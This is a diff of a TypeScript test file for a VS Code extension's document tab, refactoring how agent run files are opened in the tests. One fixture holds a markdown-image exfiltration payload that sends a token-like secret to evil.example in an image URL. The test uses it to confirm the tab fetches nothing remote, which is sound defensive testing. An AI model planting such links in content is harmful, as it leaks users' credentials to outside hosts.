@@ -9,7 +9,7 @@ import * as path from "node:path";
 import { test } from "node:test";
 import * as vscode from "vscode";
 import "./useHost";
-import { AGENT_ID, agentRunArgs, agentRunsRoot, isAgentRunFile, openAgentRunFile } from "../src/agentRun";
+import { AGENT_ID, agentRunArgs, agentRunsRoot, isAgentRunFile } from "../../core/src/agentRun";
 import { Backend } from "../../core/src/agents/claudeCode/backend";
 import { cacheDir } from "../../core/src/settings";
 import { docHtml, docTitle, initDocs } from "../src/doc";
@@ -17,6 +17,10 @@ import { planFileOf } from "../src/planReview";
 import { windowHostFile } from "../src/remoteHost";
 import { agentsNow, agentsRunningFirst } from "../../core/src/shared/model";
 import type { Agent } from "../../core/src/shared/types";
+import { VsCodeEditor } from "../src/vscodeEditor";
+
+// A run the backend saved, opened as the actions open one (this computer's file, in the doc tab)
+const openRun = (file: string) => new VsCodeEditor().showDoc(file);
 
 test("the run is saved by jump.py here and by remote.py for an SSH host", () => {
   const chat = { sessionId: "s1", chatId: "c1", profileDir: ".claude-work" };
@@ -65,7 +69,7 @@ test("in a Remote-SSH window, this computer's files are file: URIs, the window's
     initDocs(vscode.Uri.file("/ext"));
     stub.stubFiles.set("/c/agent-runs/run.md", "# Run");
     (stub.workspace.fs as { readFile: unknown }).readFile = async (u: vscode.Uri) => (calls.push([u]), fsRead(u));
-    assert.equal(await openAgentRunFile("/c/agent-runs/run.md"), "");
+    assert.equal(await openRun("/c/agent-runs/run.md"), "");
     assert.equal((calls[0][0] as vscode.Uri).scheme, "file");
     stub.recorded.panels.at(-1)!.dispose();
     const plan = vscode.Uri.file(path.join(os.homedir(), ".claude", "plans", "calm-red-owl.md"));
@@ -96,7 +100,7 @@ test("a plan, a run or a memory opens in Talpy Den's tab, which loads nothing fr
     window.showTextDocument = async (...a: unknown[]) => void opened.push(a);
     stub.stubFiles.set("/c/agent-runs/run.md", "# Deploy plan\n\n![](https://evil.example/p.png?d=ghp_SECRET) <img src=https://evil.example/q.png>");
     const before = stub.recorded.panels.length;
-    assert.equal(await openAgentRunFile("/c/agent-runs/run.md"), "");
+    assert.equal(await openRun("/c/agent-runs/run.md"), "");
     const panel = stub.recorded.panels.at(-1)! as unknown as { webview: { html: string }; title: string } & (typeof stub.recorded.panels)[number];
     assert.equal(stub.recorded.panels.length, before + 1);
     assert.equal(panel.title, "Deploy plan");
@@ -116,10 +120,10 @@ test("a plan, a run or a memory opens in Talpy Den's tab, which loads nothing fr
     assert.equal((opened[0][0] as vscode.Uri).path, "/c/agent-runs/run.md");
     // another file: the same tab
     stub.stubFiles.set("/c/agent-runs/other.md", "no heading");
-    assert.equal(await openAgentRunFile("/c/agent-runs/other.md"), "");
+    assert.equal(await openRun("/c/agent-runs/other.md"), "");
     assert.equal(stub.recorded.panels.length, before + 1);
     assert.equal(panel.title, "other");
-    assert.match(await openAgentRunFile("/c/agent-runs/gone.md"), /no file/);
+    assert.match(await openRun("/c/agent-runs/gone.md"), /no file/);
     panel.dispose();
   } finally {
     window.showTextDocument = realShow;
